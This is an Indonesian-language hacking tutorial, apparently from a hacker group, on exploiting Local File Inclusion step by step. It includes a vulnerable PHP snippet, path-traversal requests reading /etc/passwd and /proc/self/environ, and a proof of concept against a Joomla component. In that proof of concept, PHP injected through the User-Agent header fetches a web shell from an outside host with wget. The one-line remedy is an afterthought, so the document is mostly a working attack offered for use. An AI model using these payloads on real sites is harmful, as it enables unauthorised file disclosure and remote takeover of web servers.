@@ -1,0 +1,101 @@
+Local FIle Inclusion Step by Step
+Author	: Don Tukulesto (root@indonesiancoder.com)
+Homepage	: http://indonesiancoder.com
+
+[o] INDEX [o]
+
+I.	Penjelasan
+II.	Konsep
+III.	Bukti Konsep
+IV.	Perbaikan
+V.	Shout
+
+
+I.	Penjelasan
+_________________________
+
+Local File Inclusion (juga dikenal sebagai LFI) adalah proses termasuk file di server melalui web browser. Kerentanan ini terjadi karena suatu script include dalam file tersebut salah penggunaannya dan memungkinkan direktori traversal karakter dapat dilansanakan.
+
+II.	Konsep
+_________________________
+
+Konsep serangan ini adalah perintah aplikasi untuk mengakses file komputer yang tidak dimaksudkan untuk diakses. Serangan ini memanfaatkan kurangnya keamanan (perangkat lunak ini bertindak persis seperti yang seharusnya) sebagai lawan mengeksploitasi bug dalam kode. 
+
+Sebuah contoh kerentanan dalam file PHP
+
+[php]<?php
+$template = 'red.php';
+if ( isset( $_COOKIE['TEMPLATE'] ) )
+   $template = $_COOKIE['TEMPLATE'];
+include ( "/home/xtux/include/templates/" . $template );
+?>
+[/php]
+
+Sebuah serangan terhadap sistem ini bisa untuk mengirim permintaan HTTP berikut: 
+
+[code]GET /vulnerable.php HTTP/1.0
+Cookie: TEMPLATE=../../../../../../../../../etc/passwd%00[/code]
+
+Menghasilkan respon server seperti: 
+
+[quote]root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin test:x:13:30:test:/var/test:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin[/quote]
+
+III.	Bukti Konsep
+_________________________
+
+Sebagai contoh disini menggunakan kerentanan pada komponen Joomla! ckforms
+
+[quote]index.php?option=com_ckforms&controller=[/quote]
+
+http://namasitus.domain/index.php?option=com_ckforms &controller=
+
+Sekarang mari kita periksa /etc/passwd untuk memastikan bahwa ini adalah kerentanan Local File Inclusion.
+
+[quote]http://namasitus.domain/index.php?option=com_ckforms &controller= ../../../../../../../../../../../../../../../etc/passwd[/quote]
+
+berhasil disertakan
+
+[quote]root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin test:x:13:30:test:/var/test:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin[/quote]
+
+Cek apakah proc/self/environ dapat diakses ?
+
+[quote]http://namasitus.domain/index.php?option=com_ckforms &controller= ../../../../../../../../../../../../../../../proc/self/environ%00[/quote]
+
+Jika mendapatkan sesuatu seperti
+
+[quote]DOCUMENT_ROOT=/home/xtux/public_html/ GATEWAY_INTERFACE=CGI/1.1 HTTP_ACCEPT_CHARSET=ISO-8859-1,utf-8;q=0.7,*;q=0.7 HTTP_ACCEPT_ENCODING=gzip,deflate HTTP_ACCEPT_LANGUAGE=en-us,en;q=0.5 HTTP_CONNECTION=keep-alive HTTP_HOST=www.namasitus.domain HTTP_KEEP_ALIVE=115 HTTP_USER_AGENT=Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 PATH=/bin:/usr/bin QUERY_STRING=option=com_ckforms&controller=../../../../../../../../../../../../../../../proc/self/environ%00 REDIRECT_STATUS=200[/quote]
+
+artinya proc/self/environ dapat diakses. Jika mendapatkan halaman tersebut kosong, itu dapat diartikan error dalam proc/self/environ atau tidak dapat diakses bahkan mungkin OS servernya adalah FreeBSD.
+
+Langkah selanjutnya adalah penyuntikan kode berbahaya. Kita dapat menyuntikkan kode kita di User-Agent HTTP Header. Gunakan Tamper Data Addon untuk Firefox untuk mengubah User-Agent. Jika belum ada dapat di unduh Addon Tamper Data di [url=https://addons.mozilla.org/en-US/firefox/addon/966/Tamper%20Data]https://addons.mozilla.org/en-US/firefox/addon/966/Tamper Data[/url]
+
+Mulai Tamper Data di Firefox dan buka URL
+
+[quote]http://namasitus.domain/index.php?option=com_ckforms &controller= ../../../../../../../../../../../../../../../etc/passwd[/quote]
+
+Pilih Tamper dan pada kolom User-Agent isikan dengan kode berikut
+
+[quote]<?system('wget http://hostingan.domain/shell.txt -O shell.php');?>[/quote]
+
+atau
+
+[quote]<?exec('wget http://hostingan.domain/shell.txt -O shell.php');?>[/quote]
+
+kemudian tekan tombol submit. Hentikan Tamper Data, setelah itu  kita periksa apakah kode berbahaya tersebut telah berhasil disuntikkan.
+
+http://namasitus.domain/shell.php
+
+IV.	Perbaikan
+_________________________
+
+Update program CMS yang digunakan
+
+V.	Shout
+_________________________
+
+IN THE NAME OF ALLAH and MUHAMMAD SAW.
+Thx SirGod for tutorial bout Shell via LFI - proc/self/environ method
+m4h0666, M364TR0N, MISTER SAINT, GONZHACK, CYB3R_TR0N,
+kaMtiEz, ran, Ibl13z, N4ck0, chercut, M3NW5, Xr0b0t, yurakha,
+arianom, Contrex, Mboys, senot, quick_silver, and you !
+INDONESIAN CODER TEAM - Get the Codes and Feel the Soul
